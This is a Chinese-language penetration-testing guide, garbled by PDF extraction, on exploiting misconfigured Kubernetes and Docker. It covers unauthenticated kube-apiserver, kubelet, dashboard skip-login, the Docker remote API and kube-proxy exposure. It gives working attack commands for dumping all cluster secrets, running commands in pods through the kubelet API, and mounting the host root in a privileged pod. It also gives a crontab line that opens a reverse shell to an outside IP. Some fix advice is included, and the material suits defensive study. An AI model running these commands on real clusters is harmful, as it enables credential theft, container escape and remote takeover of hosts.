{ "kind": "APIVersions", "versions": [ "v1" ], 
"serverAddressByClientCIDRs": [ { "clientCIDR": "xxxx", "serverAddress": 
"xxxx" } ]}
1
⽣成临时配置⽂件
Bash
复制代码
touch test_configkubectl --kubeconfig=./test_config config set-
credentials hacker --token=TOKENkubectl --kubeconfig=./test_config config 
set-cluster hacked_cluster --server=https://IP:6443/  --insecure-skip-
tls-verifykubectl --kubeconfig=./test_config config set-context 
test_context --cluster=hacked_cluster --user=hackerkubectl --
kubeconfig=./test_config config use-context test_context
1
管控集群
Bash
复制代码
kubectl --kubeconfig=./test_config get nodes -A
1
10
为了扩⼤权限，渗透更多关联系统，我们可kubectl导出所有secret，它的内容⽐之前etcd导出的可读性更⾼ 
k8s api server存在未授权访问，攻击者可通过kubectl创建恶意pod或控制已有pod，后续可尝试逃逸⾄
宿主机
修复建议：使⽤安全端⼝替代8080端⼝，并使⽤--tls-cert-ﬁle参数开启证书认证  
访问默认8080端⼝，若存在以下回显，则漏洞存在 
kube-apiserver未授权访问 
Bash
复制代码
kubectl --kubeconfig=./test_config get secret -A -o custom-
columns=:.metadata.name,:.metadata.namespace --no-headers | xargs -n 2 sh 
-c '(kubectl --kubeconfig=./test_config get secret -n $3 -o yaml $2; echo 
"") >> all_secrets_yaml.txt' -- {}
1
11
访问http://ip:8080/api/v1/namespaces/kube-system/secrets/ 
12
创建kubectl配置⽂件，指定⽬标地址和步骤2中拿到的token等 
13
成功通过kubectl使⽤kube-system的token获取pod列表。之后可进⼀步创建pod或控制已有pod进⾏命
令执⾏等操作
通过kubectl -s命令 
获取Pods 
执⾏命令
Bash
复制代码
kubectl--kubeconfig=./test_config get pod -n kube-system -o wide
1
Bash
复制代码
curl –insecure -v -H “X-Stream-Protocol-Version: v2.channel.k8s.io” -H 
“X-Stream-Protocol-Version: channel.k8s.io” -X POST 
“https://IP:10250/exec/namespace/podID/containername?
command=touch&command=/tmp/test&input=1&output=1&tty=1"
1
Bash
复制代码
kubectl -s ip:8080 get node
1
Bash
复制代码
kubectl -s 127.0.0.1:8080 get pods
1
14
Tips: 在⾼版本的k8s中，这种⽅法是不⾏的，连不上去 
获取service-account-token 
可以通过访问api来获取token 
Bash
复制代码
kubectl -s 127.0.0.1:8080 --namespace=default exec -it nginxfromuzju-
59595f6ffc-p8xvk bash
1
Bash
复制代码
/api/v1/namespaces/kube-system/secrets/
1
15
获取宿主机权限-通过k8s dashboard，创建特权Pods 
通过创建dashboard创建pod并挂在宿主机的根⽬录 
这⾥将宿主机的⽬录挂在到了/mnt⽬录下 
可以通过写crontab获取shell 
Bash
复制代码
apiVersion: v1
kind: Pod
metadata:
  name: myapp
spec:
  containers:
  - image: nginx
    name: container
    volumeMounts:
    - mountPath: /mnt
      name: test-volume
  volumes:
  - name: test-volume
    hostPath:
      path: /
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
或者通过chroot来获取终端 
k8s node对外开启10250(kubelet API)和10255端⼝(readonly API)，攻击者可创建恶意pod或控制已有
pod，后续可尝试逃逸⾄宿主机 
修复建议：
（1）readOnlyPort=0：关闭只读端⼝(默认 10255)； 
（2）authentication.anonymous.enabled：设置为 false，不允许匿名访问 10250 端⼝； 
（3）authentication.x509.clientCAFile：指定签名客户端证书的 CA 证书，开启 HTTP 证书认证；
authentication.webhook.enabled=true：开启 HTTPs bearer token 认证 
访问https://x.x.x.x:10250/pods，有如下回显则漏洞存在 
kubelet未授权访问 
Bash
复制代码
echo -e "* * * * * /bin/bash -i >& /dev/tcp/192.168.0.139/1234 0>&1" >> 
/mnt/etc/crontab
1
17
使⽤kubeletctl批量获取pod等信息： 
Bash
复制代码
./kubeletctl pods -s x.x.x.x
1
18
可使⽤kubeletctl在特权pod内执⾏命令，挂载宿主机根⽬录，通过向宿主机批量写⼊ssh公钥逃逸到宿主
机
19
攻击者可跳过登录，直接进⼊dashboard web⻚获取pod和job等状态，并可创建恶意pod，尝试逃逸⾄
宿主机
修复建议：关闭dashboard的--enable-skip-login  
登录⻚⾯选择跳过登录
可通过dashboard获取pod、node和job等状态 
k8s dashboard认证绕过（CVE-2018-18264） 
20
若业务配置错误或为了⽅便给 Kubernetes dashboard 绑定 cluster-admin等⻆⾊，攻击者可直接在界⾯
上创建特权 pod 进⾏容器逃逸 
21
攻击者可利⽤对外暴露的docker remote api，执⾏docker命令  
修复建议：⽣成证书进⾏api校验：docker -d --tlsverify --tlscacert=ca.pem--tlscert=server-
cert.pem--tlskey=server-key.pem-H=tcp://x.x.x.x:2375-H unix:///var/run/dock 
访问http://x.x.x.x:2376/version可获取docker版本等信息，证明存在漏洞 
通过调⽤docker未授权接⼝，创建特权容器，挂载宿主机根⽬录 
docker未授权访问 
22
后续可通过写⼊ssh公钥和crontab等，完成逃逸和持久化 
攻击者可通过kube-proxy代理来未授权访问本地kube-apiserver组件，创建恶意pod或控制已有pod，
后续可尝试逃逸⾄宿主机  
修复建议：kube-proxy禁⽌对外直接使⽤--address=0.0.0.0参数 
该漏洞⼀般为业务或开发为了⽅便，通过kubectl proxy --address=0.0.0.0命令，将kube-apiserver暴
露到0.0.0.0，且默认未授权 
之后请求8001端⼝即可未授权访问kube-apiserver 
后续可按照kube-apiserver处理。 
kube-proxy配置错误 
23
https://zhuanlan.zhihu.com/p/409971135 
https://baijiahao.baidu.com/s?id=1730956371994388279&wfr=spider&for=pc 
https://copyfuture.com/blogs-details/20210616193408465N 
https://www.bilibili.com/read/cv14417297/ 
https://zhuanlan.zhihu.com/p/103124918 
感谢前⼈栽树，让后⼈可以学习乘凉，⽂章中⼤量前⼈思想。如有冒犯敬请谅解
参考⽂章
致谢